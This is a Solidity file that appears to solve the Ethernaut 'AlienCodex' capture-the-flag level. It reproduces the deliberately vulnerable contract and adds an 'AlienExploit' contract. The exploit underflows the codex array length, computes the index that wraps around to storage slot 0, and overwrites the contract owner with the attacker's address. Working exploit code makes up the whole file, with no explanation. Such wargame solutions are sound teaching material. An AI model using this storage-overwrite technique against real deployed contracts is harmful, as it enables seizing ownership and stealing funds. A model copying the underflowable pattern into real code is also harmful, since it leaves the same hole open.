// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import './helpers/Ownable.sol';
import 'hardhat/console.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}

contract AlienExploit {
    AlienCodex public alienContract;
    address public owner;
    uint256 MAX_INT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    constructor(address _alienContractAddress) public {
        owner = msg.sender;
        alienContract = AlienCodex(_alienContractAddress);
    }

    function attack() public{
        require(owner == msg.sender);

        uint256 slotNumber = 1;
        uint256 arrayStorageAddress = uint256(keccak256(abi.encodePacked(slotNumber)));

        alienContract.make_contact();
        alienContract.retract();
        alienContract.revise(
            MAX_INT - arrayStorageAddress + 1,
            bytes32(uint256(uint160(owner)))
        );

    }

}
// 0x00000000000000000000000D81d19cE53621c5Da0f997830C1b97FB872C2daa
// 0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272